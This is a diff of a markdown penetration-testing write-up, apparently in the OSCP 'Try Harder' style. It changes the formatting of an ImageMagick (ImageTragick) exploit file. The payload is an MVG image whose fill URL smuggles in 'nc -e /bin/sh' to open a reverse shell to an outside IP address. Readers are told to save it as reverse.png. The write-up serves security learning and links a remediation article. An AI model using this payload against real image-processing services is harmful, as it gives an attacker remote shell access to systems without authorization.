@@ -112,10 +112,13 @@ let's **Try Harder** and challenge ourselfs to make our **own Exploit Code**
 
 
 **push graphic-context
+<br>
 viewbox 0 0 640 480
+<br>
 fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh 10.11.29.22 "6969)'
+<br>
 pop graphic-context**
-
+<br>
 
 write this in any text editor (sublime recommended) and save it as **reverse.png** if you don't understand what is going on , [READ](https://rhinosecuritylabs.com/research/imagemagick-exploit-remediation/)  .
 
